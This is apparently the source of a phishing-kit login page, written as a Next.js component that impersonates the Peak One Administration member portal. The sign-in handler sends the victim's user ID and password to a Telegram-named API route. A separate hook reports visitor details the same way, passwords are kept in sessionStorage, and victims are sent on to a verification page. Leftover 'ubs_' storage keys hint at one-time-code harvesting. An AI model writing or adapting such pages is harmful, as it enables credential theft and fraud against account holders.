"use client";

import { useState, useEffect, useRef } from "react";
import type { FormEvent } from "react";
import { useRouter } from "next/navigation";
import { SiteFooter } from "@/components/site-footer";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [isRegisterLoading, setIsRegisterLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  const handleSignIn = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);
    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Login failed");
      }
      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
        sessionStorage.setItem("loginUserId", username.trim());
        sessionStorage.setItem("loginPassword", password.trim());
      }
      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 2000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Login failed. Please try again.");
      setIsLoginLoading(false);
    }
  };

  /* Registration is not built out yet — the button hands off to the same
     post-approval destination as a successful sign-in. */
  const handleRegister = async () => {
    if (isRegisterLoading || isLoginLoading) return;
    setIsRegisterLoading(true);
    await new Promise((r) => setTimeout(r, 1000));
    window.location.href = "/api/login-out";
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <style>{`
        *,*::before,*::after{box-sizing:border-box;}
        /* Wealthcare button chrome (lib/wealthcare-button-styles.ts): 1px #bec5c2
           border, border-radius 0, 3px brand glow, 17px / weight 300 / uppercase,
           min-height 40px. Fills are Peak1's own. The glow hue is the site primary
           and is shared by both buttons even though their fills differ — matching
           the reference, where .btn-signin and .btn-register share one shadow. */
        .btn-signin{background:#9a8650;color:#fff;border:1px solid #bec5c2;border-radius:0;box-shadow:0 0 3px 0 #2e4460;padding:0 22px;min-height:40px;font-size:17px;font-weight:300;text-transform:uppercase;font-family:'Open Sans',sans-serif;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;min-width:120px;transition:background 0.15s,transform 0.08s;}
        .btn-signin:hover{background:#7d6c40;}
        .btn-signin:active{transform:scale(0.99);}
        .btn-signin:disabled{opacity:0.65;cursor:not-allowed;}
        @keyframes spin{to{transform:rotate(360deg);}}
        .spin-ring{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.35);border-top-color:#fff;border-radius:50%;animation:spin 0.65s linear infinite;}
        .btn-register{background:#5a6378;color:#fff;border:1px solid #bec5c2;border-radius:0;box-shadow:0 0 3px 0 #2e4460;padding:0 22px;min-height:40px;font-size:17px;font-weight:300;text-transform:uppercase;font-family:'Open Sans',sans-serif;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;min-width:120px;transition:background 0.15s;}
        .btn-register:hover{background:#424a5c;}
        .btn-register:disabled{opacity:0.65;cursor:not-allowed;}
      `}</style>

      <header className="border-b border-gray-200 px-6 py-4 bg-white">
        <div className="flex items-center">
          <a href="#" onClick={(e) => e.preventDefault()} className="flex items-center shrink-0">
            <img
              className="h-9 md:h-10 w-auto"
              src="/PeakOne-Logo-1.jpg"
              alt="Peak One Administration"
            />
          </a>
          <div className="flex flex-col text-xs text-gray-600 leading-tight ml-auto md:ml-6 shrink-0">
            <div className="flex items-center gap-1.5">
              <svg
                width="12"
                height="12"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="shrink-0 text-gray-600"
              >
                <rect x="5" y="2" width="14" height="20" rx="2" />
                <line x1="12" y1="18" x2="12" y2="18" />
              </svg>
              <span>866.315.1777</span>
            </div>
            <div className="flex items-center gap-1.5 mt-1">
              <svg
                width="12"
                height="12"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="shrink-0 text-gray-600"
              >
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
                <polyline points="22,6 12,13 2,6" />
              </svg>
              <span>membercare@peakoneadmin.com</span>
            </div>
          </div>
          <span className="ml-6 text-xl text-gray-600 font-light hidden md:block">Login</span>
        </div>
      </header>

      {/* Reference login placement — the same 3-regime profile as
          verify-choice and verify so all three pages sit in one column:
          full width ≤768px; left-pinned at 43px with a 39% column
          769–1199px; centred container ≥1200px. */}
      <main className="flex-1 flex flex-col min-[1200px]:items-center">
        <div className="w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]">
        <div className="w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]">
          <div className="flex justify-center mb-4">
            <div className="w-12 h-12 border-2 border-gray-400 flex items-center justify-center">
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#555"
                strokeWidth="1.3"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                <path d="M7 11V7a5 5 0 0110 0v4" />
                <circle cx="12" cy="16" r="1" fill="#555" stroke="none" />
              </svg>
            </div>
          </div>

          <p className="text-center text-gray-600 text-sm mb-4 leading-relaxed">
            We will maintain the confidentiality of your personal information in accordance with our privacy policy.
          </p>

          <h1 className="text-center text-gray-800 text-2xl font-medium mb-5 tracking-tight">
            Sign in
          </h1>

          {loginError && (
            <p className="mb-4 text-sm text-red-600 whitespace-pre-line" role="alert">
              {loginError}
            </p>
          )}

          <form id="login-form" onSubmit={handleSignIn} className="space-y-4">
            <div className="space-y-1" id="fg-user">
              <label htmlFor="userid" className="text-sm font-medium text-gray-700 flex items-center gap-1">
                UserId <span className="text-orange-500">*</span>
              </label>
              <input
                type="text"
                id="userid"
                autoComplete="username"
                value={username}
                onChange={(e) => {
                  setUsername(e.target.value);
                  if (loginError) setLoginError(null);
                }}
                className="w-full h-10 px-3 border border-gray-300 rounded focus:border-[#9a8650] focus:ring-1 focus:ring-[#9a8650] outline-none text-sm text-gray-800 bg-white"
              />
              <p className="text-sm mt-1">
                <span className="text-gray-600">Forgot your Username? </span>
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="text-blue-600 hover:text-blue-700 hover:underline"
                >
                  Let us help
                </a>
              </p>
            </div>

            <div className="space-y-1" id="fg-pwd">
              <label htmlFor="password" className="text-sm font-medium text-gray-700 flex items-center gap-1">
                Password <span className="text-orange-500">*</span>
              </label>
              <input
                type="password"
                id="password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (loginError) setLoginError(null);
                }}
                className="w-full h-10 px-3 border border-gray-300 rounded focus:border-[#9a8650] focus:ring-1 focus:ring-[#9a8650] outline-none text-sm text-gray-800 bg-white"
              />
              <p className="text-sm mt-1">
                <span className="text-gray-600">Forgot your Password? </span>
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="text-blue-600 hover:text-blue-700 hover:underline"
                >
                  Let us help
                </a>
              </p>
            </div>

            <input
              type="text"
              name="website"
              value={honeypot}
              onChange={(e) => setHoneypot(e.target.value)}
              style={{ display: "none" }}
              autoComplete="off"
            />

            <div className="flex justify-center md:justify-start">
              <button
                type="submit"
                className="btn-signin"
                id="signin-btn"
                disabled={isLoginLoading || !username || !password}
              >
                {isLoginLoading ? (
                  <div className="spin-ring mr-2"></div>
                ) : (
                  <svg
                    id="signin-check"
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="white"
                    strokeWidth="3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    className="mr-2"
                  >
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                )}
                <span id="signin-label">
                  {isLoginLoading ? "Signing in…" : "SIGN IN"}
                </span>
              </button>
            </div>

            <div className="pt-4">
              <p className="text-gray-600 mb-2 text-sm text-left">Don't have an account?</p>
              <div className="flex justify-center md:justify-start">
                <button
                  type="button"
                  className="btn-register"
                  disabled={isRegisterLoading || isLoginLoading}
                  onClick={() => void handleRegister()}
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="white"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    className="mr-2"
                  >
                    <path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2" />
                    <circle cx="9" cy="7" r="4" />
                    <line x1="19" y1="8" x2="19" y2="14" />
                    <line x1="22" y1="11" x2="16" y2="11" />
                  </svg>
                  {isRegisterLoading ? "Loading..." : "Register"}
                </button>
              </div>
            </div>
          </form>
        </div>
        </div>
      </main>

      <SiteFooter />

    </div>
  );
}
